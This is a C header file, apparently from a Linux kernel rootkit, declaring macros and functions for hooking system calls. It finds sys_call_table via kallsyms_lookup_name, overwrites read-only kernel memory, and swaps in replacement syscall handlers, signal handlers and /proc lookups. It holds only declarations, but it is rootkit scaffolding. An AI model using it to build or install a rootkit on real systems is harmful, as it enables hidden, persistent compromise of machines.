#ifndef _ROOTKIT_HOOKING_H_
#define _ROOTKIT_HOOKING_H_

#include "constants.h"
#include "macro_utils.h"
#include <asm/ptrace.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/types.h>

#define KALLSYMS_NAME       "kallsyms_lookup_name" /* Name of the `kallsyms_lookup_name` function */
#define SYS_CALL_TABLE_NAME "sys_call_table"       /* Name of the `sys_call_table` variable */

/**
 * Creates a new `hook_t` structure with the given syscall number,
 * new syscall function, and pointer to the original syscall function.
 *
 * @param _syscall_nr  The syscall number
 * @param _new_sysfun  The new syscall function
 * @param _orig_sysfun The pointer to the original syscall function
 * @return The new `hook_t` structure
 */
#define NEW_HOOK(_syscall_nr, _new_sysfun, _orig_sysfun)             \
    {                                                                \
        .sz_syscall_nr = (_syscall_nr), .new_sysfun = (_new_sysfun), \
        .p_orig_sysfun = &(_orig_sysfun)                             \
    }

/**
 * Creates a new `signal_handler_t` structure with the given PID, signal number,
 * and signal handler function.
 *
 * @param _pid         The process ID (< 0 for any PID)
 * @param _sig         The signal number (< 0 for any signal)
 * @param _sig_handler The signal handler function
 * @return The new `signal_handler_t` structure
 */
#define NEW_SIGNAL_HANDLER(_pid, _sig, _sig_handler)                        \
    {                                                                       \
        .i32_pid = (_pid), .i32_sig = (_sig), .sig_handler = (_sig_handler) \
    }

/**
 * Gets the original syscall function pointer for the given syscall
 * from the `p_orig_sysfuns` array.
 *
 * @param _syscall_name The syscall name
 * @return The original syscall function pointer
 */
#define ORIG_SYSFUN(_syscall_name) p_orig_sysfuns[__NR_##_syscall_name]

/**
 * Creates a new `hook_t` structure from the given syscalls.
 * The new syscall function name is defined by the `HOOK_HANDLER_NAME` macro.
 *
 * @param _syscall_name The syscall name
 * @return The new `hook_t` structure
 */
#define SYSCALL_HOOK(_syscall_name) \
    NEW_HOOK(__NR_##_syscall_name, HOOK_HANDLER_NAME(_syscall_name), ORIG_SYSFUN(_syscall_name))

/**
 * Creates an array of `hook_t` structures from the given syscall.
 * The new syscall function names are defined by the `HOOK_HANDLER_NAME` macro.
 *
 * @param ... The syscall names
 * @return The array of `hook_t` structures
 */
#define SYSCALL_HOOKS(...)                                       \
    {                                                            \
        __MAPX_LIST(SYSCALL_HOOK, __VA_ARGS__),                  \
        {                                                        \
            /* The last element must have a NULL `new_sysfun` */ \
            0, NULL, NULL                                        \
        }                                                        \
    }

/**
 * Declares hook handler functions for the given syscall from argument 2 onwards,
 * and initializes an array of `hook_t` structures for them.
 * The new syscall function names are defined by the `HOOK_HANDLER_NAME` macro.
 *
 * @param _sc_hooks_var The name of the array of `hook_t` structures
 * @param ...           The syscall names
 */
#define INIT_HOOK_HANDLERS(_sc_hooks_var, ...) \
    DECLARE_HOOK_HANDLERS(__VA_ARGS__)         \
    hook_t _sc_hooks_var[] = SYSCALL_HOOKS(__VA_ARGS__);

typedef void *(*kallsyms_t)(const char *s_name);        // The type of `kallsyms_lookup_name()`.
typedef long (*sysfun_t)(struct pt_regs *const p_regs); // The type of a syscall function.

typedef struct proc_dir_entry proc_dir_entry_t; // The type of a /proc entry.
typedef proc_dir_entry_t *(*pde_subdir_find_t)(proc_dir_entry_t *dir,
                                               const char *name,
                                               unsigned int len);

/**
 * Structure representing a syscall hook.
 */
typedef struct hook_tag {
    const size_t sz_syscall_nr; // The syscall number
    sysfun_t const new_sysfun;  // The new syscall function
    sysfun_t *p_orig_sysfun;    // A pointer to the original syscall function
} hook_t;

/**
 * Structure representing a signal handler.
 */
typedef struct signal_handler_tag {
    const pid_t i32_pid; // The process ID (PID_ANY for any PID)
    const int i32_sig;   // The signal number (< 0 for any signal)
    long (*const sig_handler)(const pid_t i32_pid,
                              const int i32_sig); // The signal handler function
} signal_handler_t;

extern kallsyms_t lookup_name; // Function pointer for `kallsyms_lookup_name()`.

/**
 * Changes a read-only value.
 *
 * @param p_addr    The address of the value to change
 * @param p_new_val The new value
 */
void change_protected_value(void *const p_addr, void *const p_new_val);

/**
 * Initializes the hooking module.
 * @note This function must be called before any other hooking function or macro.
 */
int init_hooking(void) __init;

/**
 * Gets the function pointer of the syscall entry for the given syscall number.
 *
 * @param sz_syscall_nr The syscall number
 * @return The function pointer of the syscall entry
 */
sysfun_t get_syscall_entry(const size_t sz_syscall_nr);

/**
 * Sets the function pointer of the syscall entry for the given syscall number.
 *
 * @param sz_syscall_nr The syscall number
 * @param new_sysfun    The new syscall function pointer
 */
void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun);

/**
 * Hooks the given syscall.
 *
 * @param p_hook The hook to be installed
 * @return 0 on success, otherwise an error code
 */
int hook_syscall(hook_t *const p_hook);

/**
 * Unhooks the given syscall.
 *
 * @param p_hook The hook to be uninstalled
 */
void unhook_syscall(const hook_t *const p_hook);

/**
 * Hooks the given syscalls.
 * The syscalls are hooked in the order they appear in the array.
 * If an error occurs, the already installed hooks are uninstalled in reverse order.
 *
 * @param p_hooks The array of hooks to be installed (the last element must have a NULL `new_sysfun`)
 * @return 0 on success, otherwise an error code
 */
int hook_syscalls(hook_t p_hooks[]) __init;

/**
 * Unhooks the given syscalls.
 * The syscalls are unhooked in the order they appear in the array.
 *
 * @param p_hooks The array of hooks to be uninstalled (the last element must have a NULL `new_sysfun`)
 */
void unhook_syscalls(const hook_t p_hooks[]) __exit;

/**
 * Gets the /proc dir entry for the given name.
 *
 * @param s_name The name of the /proc entry
 * @return The /proc dir entry
 */
proc_dir_entry_t *get_proc_entry(const char *const s_name);

#endif
